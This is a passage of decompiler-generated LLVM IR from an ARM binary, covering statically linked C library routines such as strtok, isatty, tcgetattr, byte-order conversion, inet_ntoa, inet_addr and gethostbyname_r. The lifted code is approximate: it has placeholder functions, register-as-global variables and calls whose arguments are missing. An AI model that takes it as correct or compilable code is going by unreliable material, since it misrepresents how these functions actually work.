  %v1_15570 = add i32 %v0_1551c.ph, 1
  %v2_15574 = icmp eq i8 %v2_15524, 0
  br i1 %v2_15574, label %dec_label_pc_15584, label %dec_label_pc_15508.outer

dec_label_pc_15584:                               ; preds = %dec_label_pc_15570
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_15508, { 2, 1, 0 }
  uselistorder i8 %v2_15524, { 0, 2, 1 }
  uselistorder i32 %v0_1552c22, { 1, 0 }
  uselistorder i32 %v0_1551c.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15508.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15524, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2c88c.963 to i32), i32* @r2, align 4
  %v0_15594 = call i32 @strtok_r()
  %v0_15598 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15598, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_15598 = load i32, i32* @r2, align 4
  %v2_15598 = load i32, i32* @ip, align 4
  %v5_15598 = mul i32 %v2_15598, 131072
  %v6_15598 = and i32 %v5_15598, %v1_15598
  store i32 %v6_15598, i32* @ip, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_15594

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_155a0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_155a0, i32* @r1, align 4
  %v0_155a8 = call i32 @__GI_tcgetattr()
  %v1_155ac = sub i32 1, %v0_155a8
  %v2_155ac = icmp ult i32 %v0_155a8, 2
  br i1 %v2_155ac, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_155b8 = phi i32 [ %v1_155ac, %entry ], [ 0, %bb ]
  ret i32 %v5_155b8

; uselistorder directives
  uselistorder i32 %v0_155a8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_155bc = load i32, i32* @r4, align 4
  %v6_155bc = load i32, i32* @r5, align 4
  %v2_155c0 = ptrtoint i32* %stack_var_-56 to i32
  %v0_155c4 = load i32, i32* @r1, align 4
  store i32 %v0_155c4, i32* %r6.global-to-local, align 4
  %v0_155d0 = load i32, i32* @r0, align 4
  %v3_155d0 = call i32 @ioctl(i32 %v0_155d0, i32 21505, i32 %v2_155c0)
  store i32 %v3_155d0, i32* %r7.global-to-local, align 4
  %v2_155d4 = icmp eq i32 %v3_155d0, 0
  %v2_155dc = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_155dc, i32* @r1, align 4
  %v0_155e4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_155d4, label %dec_label_pc_155ec, label %dec_label_pc_15618

dec_label_pc_155ec:                               ; preds = %entry
  %v1_155e4 = add i32 %v0_155e4, 17
  %v4_155f4 = zext i8 %tmp to i32
  store i32 %v4_155f4, i32* @r5, align 4
  %v2_155f8 = load i32, i32* %stack_var_-56, align 4
  %v1_155fc = inttoptr i32 %v0_155e4 to i32*
  store i32 %v2_155f8, i32* %v1_155fc, align 4
  %v3_155fc = add i32 %v0_155e4, 4
  %v4_155fc = inttoptr i32 %v3_155fc to i32*
  %v5_155fc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_155fc, i32* %v4_155fc, align 4
  %v6_155fc = add i32 %v0_155e4, 8
  %v7_155fc = inttoptr i32 %v6_155fc to i32*
  %v8_155fc = load i32, i32* @lr, align 4
  store i32 %v8_155fc, i32* %v7_155fc, align 4
  %v0_15600 = load i32, i32* @r4, align 4
  %v1_15600 = load i32, i32* %r6.global-to-local, align 4
  %v2_15600 = add i32 %v1_15600, 12
  %v3_15600 = inttoptr i32 %v2_15600 to i32*
  store i32 %v0_15600, i32* %v3_15600, align 4
  %v0_15604 = load i32, i32* @r5, align 4
  %v1_15604 = trunc i32 %v0_15604 to i8
  %v2_15604 = load i32, i32* %r6.global-to-local, align 4
  %v3_15604 = add i32 %v2_15604, 16
  %v4_15604 = inttoptr i32 %v3_15604 to i8*
  store i8 %v1_15604, i8* %v4_15604, align 1
  %v4_15608 = call i32 @__GI_mempcpy(i32 %v1_155e4, i32 %v2_155dc, i32 19, i32 %v2_155f8)
  %v0_1560c = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15614 = inttoptr i32 %v4_15608 to i8*
  %v3_15614 = call i32 @__GI_memset(i8* %v2_15614, i32 %v0_1560c)
  br label %dec_label_pc_15618

dec_label_pc_15618:                               ; preds = %entry, %dec_label_pc_155ec
  %v0_15618 = phi i32 [ %v3_155d0, %entry ], [ %v0_1560c, %dec_label_pc_155ec ]
  store i32 %v3_155bc, i32* @r4, align 4
  store i32 %v6_155bc, i32* @r5, align 4
  ret i32 %v0_15618

; uselistorder directives
  uselistorder i32 %v0_155e4, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15618, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_15644 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_15644
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_15654 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15658 = urem i32 %tmp1, 256
  %v5_15658 = or i32 %v4_15658, %v1_15654
  ret i32 %v5_15658

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1567c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_1567c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_1568c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_15690 = urem i32 %tmp1, 256
  %v5_15690 = or i32 %v4_15690, %v1_1568c
  ret i32 %v5_15690

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_15698 = load i32, i32* @r4, align 4
  %v6_15698 = load i32, i32* @r5, align 4
  %v9_15698 = load i32, i32* @r6, align 4
  %v0_1569c = load i32, i32* @r0, align 4
  %v2_156bc = call i32 @llvm.bswap.i32(i32 %v0_1569c)
  %v0_156c0 = load i32, i32* @r1, align 4
  %v1_156c0 = add i32 %v0_156c0, 15
  store i32 %v1_156c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_156ec

dec_label_pc_156cc:                               ; preds = %dec_label_pc_156ec
  %v1_156f0 = urem i32 %v0_15700, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_156d4 = inttoptr i32 %v0_1570c to i8*
  %v6_156d4 = call i32 @_uintmaxtostr(i8* %v5_156d4, i32 %v1_156f0, i32 0, i32 -10, i32 0)
  %v0_156d8 = load i32, i32* @r6, align 4
  %v2_156d8 = icmp eq i32 %v0_156d8, 0
  %v1_156dc = add i32 %v6_156d4, -1
  store i32 %v1_156dc, i32* %ip.global-to-local, align 4
  br i1 %v2_156d8, label %dec_label_pc_156ec.backedge, label %bb

dec_label_pc_156ec.backedge:                      ; preds = %bb, %dec_label_pc_156cc
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_156dc, %dec_label_pc_156cc ]
  %v0_156ec.pre = load i32, i32* @r5, align 4
  %v0_156f0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_156ec

bb:                                               ; preds = %dec_label_pc_156cc
  %v4_156e4 = inttoptr i32 %v0_156d8 to i8*
  store i8 46, i8* %v4_156e4, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_156ec.backedge

dec_label_pc_156ec:                               ; preds = %dec_label_pc_156ec.backedge, %entry
  %v0_1570c = phi i32 [ %v1_156c0, %entry ], [ %storemerge.pre, %dec_label_pc_156ec.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_156ec.backedge ]
  %v0_15700 = phi i32 [ %v2_156bc, %entry ], [ %v0_156f0.pre, %dec_label_pc_156ec.backedge ]
  %v0_15704 = phi i32 [ 0, %entry ], [ %v0_156ec.pre, %dec_label_pc_156ec.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_156ec = icmp eq i32 %v0_15704, 3
  store i1 %v7_156ec, i1* @cpsr_z, align 1
  %v3_15700 = udiv i32 %v0_15700, 256
  store i32 %v3_15700, i32* @r4, align 4
  %v1_15704 = add i32 %v0_15704, 1
  store i32 %v1_15704, i32* @r5, align 4
  %v7_15708 = icmp sgt i32 %v0_15704, 3
  br i1 %v7_15708, label %dec_label_pc_1570c, label %dec_label_pc_156cc

dec_label_pc_1570c:                               ; preds = %dec_label_pc_156ec
  %v1_1570c = add i32 %v0_1570c, 1
  store i32 %v3_15698, i32* @r4, align 4
  store i32 %v6_15698, i32* @r5, align 4
  store i32 %v9_15698, i32* @r6, align 4
  ret i32 %v1_1570c

; uselistorder directives
  uselistorder i32 %v0_15704, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2c890.966 to i32), i32* @r1, align 4
  %v0_1571c = call i32 @__GI_inet_ntoa_r()
  %v0_15720 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15720, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_1571c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_15728 = ptrtoint i32* %stack_var_-8 to i32
  %v0_15730 = load i32, i32* @r0, align 4
  %v2_15730 = inttoptr i32 %v0_15730 to i8*
  %v3_15730 = call i32 @inet_aton(i8* %v2_15730, i32 %v2_15728)
  %v2_15734 = icmp eq i32 %v3_15730, 0
  br i1 %v2_15734, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_1573c = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_15744 = phi i32 [ -1, %entry ], [ %v3_1573c, %bb ]
  ret i32 %v5_15744

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_15748 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15754 = call i32 @__GI___h_errno_location()
  %v2_15758 = ptrtoint i32* %stack_var_-12 to i32
  %v0_15764 = load i32, i32* @r4, align 4
  %v7_15774 = call i32 @gethostbyname_r(i32 %v0_15764, i32* nonnull @global_var_2ca6c.968, i32 ptrtoint (i32* @global_var_2c8a0.970 to i32), i32 460, i32 %v2_15758, i32 %v0_15754)
  %v3_15778 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_15748, i32* @r4, align 4
  ret i32 %v3_15778
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_1578c = load i32, i32* @r5, align 4
  %v9_1578c = load i32, i32* @r6, align 4
  %v12_1578c = load i32, i32* @r7, align 4
  %v15_1578c = load i32, i32* @r8, align 4
  %v18_1578c = load i32, i32* @sb, align 4
  %v21_1578c = load i32, i32* @sl, align 4
  %v24_1578c = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_1579c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1579c, i32* @fp, align 4
  %v2_1579c = icmp eq i32 %v0_1579c, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_157ac = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_157ac, align 4
  br i1 %v2_1579c, label %bb, label %dec_label_pc_157b8

bb:                                               ; preds = %entry
  %v1_157b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_157b0 = add i32 %v1_157b0, 22
  store i32 %v2_157b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15adc

dec_label_pc_157b8:                               ; preds = %entry
  %v0_157b8 = call i32 @__errno_location()
  store i32 %v0_157b8, i32* %r0.global-to-local, align 4
  %v3_157bc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_157bc, i32* %ip.global-to-local, align 4
  %v1_157c0 = inttoptr i32 %v0_157b8 to i32*
  %v2_157c0 = load i32, i32* %v1_157c0, align 4
  store i32 %v2_157c0, i32* @r8, align 4
  %v0_157c4 = load i32, i32* @r6, align 4
  store i32 %v0_157c4, i32* %v1_157c0, align 4
  %v0_157c8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_157b8, i32* @r5, align 4
  %v0_157d8 = load i32, i32* @fp, align 4
  store i32 %v0_157d8, i32* %r0.global-to-local, align 4
  %v0_157dc = load i32, i32* @sl, align 4
  store i32 %v0_157dc, i32* %r2.global-to-local, align 4
  %v0_157e0 = load i32, i32* @r7, align 4
  store i32 %v0_157e0, i32* %r3.global-to-local, align 4
  %v0_157e4 = load i32, i32* @r4, align 4
  %v7_157ec = call i32 @__get_hosts_byname_r(i32 %v0_157d8, i32 2, i32 %v0_157dc, i32 %v0_157e0, i32 %v0_157e4, i32 %v0_157c8, i32 %arg6)
  store i32 %v7_157ec, i32* %r0.global-to-local, align 4
  %v2_157f0 = icmp eq i32 %v7_157ec, 0
  br i1 %v2_157f0, label %dec_label_pc_15adc, label %dec_label_pc_157f8

dec_label_pc_157f8:                               ; preds = %dec_label_pc_157b8
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_157fc = inttoptr i32 %arg6 to i32*
  %v2_157fc = load i32, i32* %v1_157fc, align 4
  store i32 %v2_157fc, i32* %r3.global-to-local, align 4
  %v7_15800 = icmp eq i32 %v2_157fc, 1
  br i1 %v7_15800, label %dec_label_pc_15824, label %dec_label_pc_15808

dec_label_pc_15808:                               ; preds = %dec_label_pc_157f8
  %v7_15808 = icmp eq i32 %v2_157fc, 4
  br i1 %v7_15808, label %dec_label_pc_15824, label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %dec_label_pc_15808
  %v3_15810 = icmp eq i32 %v2_157fc, -1
  br i1 %v3_15810, label %dec_label_pc_15818, label %dec_label_pc_15adc

dec_label_pc_15818:                               ; preds = %dec_label_pc_15810
  %v0_15818 = load i32, i32* @r5, align 4
  %v1_15818 = inttoptr i32 %v0_15818 to i32*
  %v2_15818 = load i32, i32* %v1_15818, align 4
  store i32 %v2_15818, i32* %r3.global-to-local, align 4
  %v7_1581c = icmp eq i32 %v2_15818, 2
  br i1 %v7_1581c, label %dec_label_pc_15824, label %dec_label_pc_15adc

dec_label_pc_15824:                               ; preds = %dec_label_pc_15818, %dec_label_pc_15808, %dec_label_pc_157f8
  %v0_15824 = load i32, i32* @r7, align 4
  %v1_15824 = sub i32 0, %v0_15824
  %v1_15828 = urem i32 %v1_15824, 4
  store i32 %v1_15828, i32* %r3.global-to-local, align 4
  %v2_15828 = icmp eq i32 %v1_15828, 0
  %v0_1582c = load i32, i32* @r8, align 4
  %v1_1582c = load i32, i32* @r5, align 4
  %v2_1582c = inttoptr i32 %v1_1582c to i32*
  store i32 %v0_1582c, i32* %v2_1582c, align 4
  %v0_1584c.pre = load i32, i32* @r4, align 4
  br i1 %v2_15828, label %dec_label_pc_15844, label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %dec_label_pc_15824
  %v1_15834 = load i32, i32* %r3.global-to-local, align 4
  %v2_15834 = sub i32 %v0_1584c.pre, %v1_15834
  %v3_15834 = icmp ult i32 %v0_1584c.pre, %v1_15834
  br i1 %v3_15834, label %dec_label_pc_15ad8, label %dec_label_pc_1583c

dec_label_pc_1583c:                               ; preds = %dec_label_pc_15834
  store i32 %v2_15834, i32* @r4, align 4
  %v0_15840 = load i32, i32* @r7, align 4
  %v2_15840 = add i32 %v0_15840, %v1_15834
  store i32 %v2_15840, i32* @r7, align 4
  br label %dec_label_pc_15844

dec_label_pc_15844:                               ; preds = %dec_label_pc_15824, %dec_label_pc_1583c
  %v0_1584c = phi i32 [ %v2_15834, %dec_label_pc_1583c ], [ %v0_1584c.pre, %dec_label_pc_15824 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_157fc, align 4
  %tmp31 = icmp ult i32 %v0_1584c, 4
  br i1 %tmp31, label %dec_label_pc_15ad8, label %dec_label_pc_15858

dec_label_pc_15858:                               ; preds = %dec_label_pc_15844
  %v0_15858 = load i32, i32* @r4, align 4
  %v1_15858 = add i32 %v0_15858, -4
  store i32 %v1_15858, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_15858, 8
  br i1 %tmp32, label %dec_label_pc_15ad8, label %dec_label_pc_15864

dec_label_pc_15864:                               ; preds = %dec_label_pc_15858
  %v1_15864 = add i32 %v0_15858, -12
  store i32 %v1_15864, i32* %r3.global-to-local, align 4
  %v0_15868 = load i32, i32* @r7, align 4
  %v1_15868 = add i32 %v0_15868, 4
  store i32 %v1_15868, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_15874 = inttoptr i32 %v1_15868 to i32*
  store i32 %v0_15868, i32* %v3_15874, align 4
  %v0_15878 = load i32, i32* @r5, align 4
  %v1_15878 = load i32, i32* @sb, align 4
  %v2_15878 = add i32 %v1_15878, 4
  %v3_15878 = inttoptr i32 %v2_15878 to i32*
  store i32 %v0_15878, i32* %v3_15878, align 4
  %tmp33 = icmp ult i32 %v1_15864, 32
  br i1 %tmp33, label %dec_label_pc_15ad8, label %dec_label_pc_15880

dec_label_pc_15880:                               ; preds = %dec_label_pc_15864
  %v0_15880 = load i32, i32* @r4, align 4
  %v1_15880 = add i32 %v0_15880, -44
  store i32 %v1_15880, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_15880, 256
  br i1 %tmp34, label %dec_label_pc_15ad8, label %dec_label_pc_1588c

dec_label_pc_1588c:                               ; preds = %dec_label_pc_15880
  %v0_1588c = load i32, i32* @r7, align 4
  %v1_1588c = add i32 %v0_1588c, 44
  store i32 %v1_1588c, i32* @r6, align 4
  %v1_15890 = add i32 %v0_1588c, 12
  store i32 %v1_15890, i32* %r3.global-to-local, align 4
  %v0_15894 = load i32, i32* @fp, align 4
  store i32 %v0_15894, i32* @r1, align 4
  store i32 %v1_15880, i32* %r2.global-to-local, align 4
  store i32 %v1_1588c, i32* %r0.global-to-local, align 4
  %v3_158a4 = call i32 @strncpy(i32 %v1_1588c, i32 %v0_15894, i32 %v1_15880)
  store i32 %v1_15890, i32* %ip.global-to-local, align 4
  %v0_158ac = load i32, i32* @r6, align 4
  %v1_158ac = load i32, i32* @r7, align 4
  %v2_158ac = add i32 %v1_158ac, 12
  %v3_158ac = inttoptr i32 %v2_158ac to i32*
  store i32 %v0_158ac, i32* %v3_158ac, align 4
  %v0_158b0 = load i32, i32* @fp, align 4
  store i32 %v0_158b0, i32* %r0.global-to-local, align 4
  %v0_158b4 = load i32, i32* @r5, align 4
  %v1_158b4 = load i32, i32* %ip.global-to-local, align 4
  %v2_158b4 = add i32 %v1_158b4, 4
  %v3_158b4 = inttoptr i32 %v2_158b4 to i32*
  store i32 %v0_158b4, i32* %v3_158b4, align 4
  %v0_158b8 = load i32, i32* @r7, align 4
  %v2_158bc = inttoptr i32 %v0_158b0 to i8*
  %v3_158bc = call i32 @inet_aton(i8* %v2_158bc, i32 %v0_158b8)
  store i32 %v3_158bc, i32* %r0.global-to-local, align 4
  %v2_158c0 = icmp eq i32 %v3_158bc, 0
  br i1 %v2_158c0, label %dec_label_pc_15904, label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %dec_label_pc_1588c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_158d0 = load i32, i32* @sl, align 4
  %v2_158d0 = add i32 %v1_158d0, 8
  %v3_158d0 = inttoptr i32 %v2_158d0 to i32*
  store i32 2, i32* %v3_158d0, align 4
  %v0_158d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_158d4 = mul i32 %v0_158d4, 2
  %v1_158d8 = load i32, i32* @sl, align 4
  %v2_158d8 = add i32 %v1_158d8, 12
  %v3_158d8 = inttoptr i32 %v2_158d8 to i32*
  store i32 %v2_158d4, i32* %v3_158d8, align 4
  %v3_158dc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_158dc, i32* %r2.global-to-local, align 4
  store i32 %v1_15890, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_158e8 = load i32, i32* @r5, align 4
  store i32 %v0_158e8, i32* %r0.global-to-local, align 4
  %v0_158ec = load i32, i32* @sl, align 4
  %v2_158ec = inttoptr i32 %v3_158dc to i32*
  store i32 %v0_158ec, i32* %v2_158ec, align 4
  %v0_158f0 = load i32, i32* @r6, align 4
  %v1_158f0 = load i32, i32* @sl, align 4
  %v2_158f0 = inttoptr i32 %v1_158f0 to i32*
  store i32 %v0_158f0, i32* %v2_158f0, align 4
  %v0_158f4 = load i32, i32* @sb, align 4
  %v1_158f4 = load i32, i32* @sl, align 4
  %v2_158f4 = add i32 %v1_158f4, 16
  %v3_158f4 = inttoptr i32 %v2_158f4 to i32*
  store i32 %v0_158f4, i32* %v3_158f4, align 4
  %v0_158f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_158f8 = load i32, i32* @sl, align 4
  %v2_158f8 = add i32 %v1_158f8, 4
  %v3_158f8 = inttoptr i32 %v2_158f8 to i32*
  store i32 %v0_158f8, i32* %v3_158f8, align 4
  %v0_158fc = load i32, i32* @r5, align 4
  %v1_158fc = load i32, i32* %ip.global-to-local, align 4
  %v2_158fc = inttoptr i32 %v1_158fc to i32*
  store i32 %v0_158fc, i32* %v2_158fc, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15904:                               ; preds = %dec_label_pc_1588c
  %v2_15904 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_15904, i32* @r5, align 4
  %v1_15908 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_2682c.972 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_15904, i32* @r0, align 4
  store i32 94268, i32* %r3.global-to-local, align 4
  %v1_15920 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_17034.847 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2682c.972 to i32), i32* %r0.global-to-local, align 4
  %v1_15930 = call i32 @__pthread_return_0()
  store i32 %v2_15904, i32* @r0, align 4
  %v2_1593c = load i32, i32* @global_var_2cba4.977, align 4
  store i32 %v2_1593c, i32* @r4, align 4
  store i32 94268, i32* %r3.global-to-local, align 4
  %v1_1594c = call i32 @__pthread_return_void()
  %v2_15958 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2cb98.980 to i32), i32* %r3.global-to-local, align 4
  %v0_15964 = load i32, i32* @fp, align 4
  store i32 %v0_15964, i32* %r0.global-to-local, align 4
  %v2_15968 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_15968, i32* %ip.global-to-local, align 4
  %v0_1596c = load i32, i32* @r4, align 4
  store i32 %v0_1596c, i32* %r2.global-to-local, align 4
  %v6_15980 = inttoptr i32 %v0_15964 to i8*
  %v7_15980 = call i32 @__dns_lookup(i8* %v6_15980, i32 1, i32 %v0_1596c, i32 ptrtoint (i32* @global_var_2cb98.980 to i32), i32 %v2_15958, i32 %v2_15968)
  store i32 %v7_15980, i32* %r0.global-to-local, align 4
  %v1_15984 = icmp slt i32 %v7_15980, 0
  br i1 %v1_15984, label %.dec_label_pc_15ab0_crit_edge, label %dec_label_pc_15994

.dec_label_pc_15ab0_crit_edge:                    ; preds = %dec_label_pc_15904
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ab0

dec_label_pc_15994:                               ; preds = %dec_label_pc_15904
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_159a8 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_159a8, 255
  br i1 %tmp35, label %dec_label_pc_15a44, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_15994
  %v3_159b0 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_159b0, i32* @r0, align 4
  %v0_159b4 = call i32 @free()
  %v3_159b8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_159b8, i32* @r0, align 4
  %v0_159bc = call i32 @free()
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_157fc, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15a44:                               ; preds = %dec_label_pc_15994
  %v3_15a48.pre = load i32, i32* %stack_var_-96, align 4
  %v0_15a4c.pre = load i32, i32* @r6, align 4
  store i32 %v1_159a8, i32* %r2.global-to-local, align 4
  store i32 %v3_15a48.pre, i32* @r1, align 4
  store i32 %v0_15a4c.pre, i32* %r0.global-to-local, align 4
  %v3_15a50 = call i32 @strncpy(i32 %v0_15a4c.pre, i32 %v3_15a48.pre, i32 %v1_159a8)
  %v3_15a54 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_15a54, i32* @r0, align 4
  %v0_15a58 = call i32 @free()
  store i32 %v0_15a58, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_15a60 = icmp eq i32 %tmp7, 1
  br i1 %v7_15a60, label %dec_label_pc_15a68, label %dec_label_pc_15abc

dec_label_pc_15a68:                               ; preds = %dec_label_pc_15a44
  store i32 4, i32* @r2, align 4
  %v0_15a70 = load i32, i32* @r7, align 4
  store i32 %v0_15a70, i32* @r0, align 4
  %v0_15a74 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_15890, i32* %r2.global-to-local, align 4
  %v1_15a80 = load i32, i32* @sl, align 4
  %v2_15a80 = add i32 %v1_15a80, 8
  %v3_15a80 = inttoptr i32 %v2_15a80 to i32*
  store i32 2, i32* %v3_15a80, align 4
  %v0_15a84 = load i32, i32* %r3.global-to-local, align 4
  %v2_15a84 = mul i32 %v0_15a84, 2
  store i32 %v2_15a84, i32* %r3.global-to-local, align 4
  %v1_15a88 = load i32, i32* @sl, align 4
  %v2_15a88 = add i32 %v1_15a88, 12
  %v3_15a88 = inttoptr i32 %v2_15a88 to i32*
  store i32 %v2_15a84, i32* %v3_15a88, align 4
  %v3_15a8c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_15a8c, i32* @r0, align 4
  %v0_15a90 = load i32, i32* @r6, align 4
  %v1_15a90 = load i32, i32* @sl, align 4
  %v2_15a90 = inttoptr i32 %v1_15a90 to i32*
  store i32 %v0_15a90, i32* %v2_15a90, align 4
  %v0_15a94 = load i32, i32* @sb, align 4
  %v1_15a94 = load i32, i32* @sl, align 4
  %v2_15a94 = add i32 %v1_15a94, 16
  %v3_15a94 = inttoptr i32 %v2_15a94 to i32*
  store i32 %v0_15a94, i32* %v3_15a94, align 4
  %v0_15a98 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a98 = load i32, i32* @sl, align 4
  %v2_15a98 = add i32 %v1_15a98, 4
  %v3_15a98 = inttoptr i32 %v2_15a98 to i32*
  store i32 %v0_15a98, i32* %v3_15a98, align 4
  %v0_15a9c = call i32 @free()
  %v3_15aa0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_15aa0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_15aa8 = load i32, i32* @sl, align 4
  %v2_15aa8 = inttoptr i32 %v3_15aa0 to i32*
  store i32 %v0_15aa8, i32* %v2_15aa8, align 4
  %v0_15aac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_15aac, i32* %r0.global-to-local, align 4
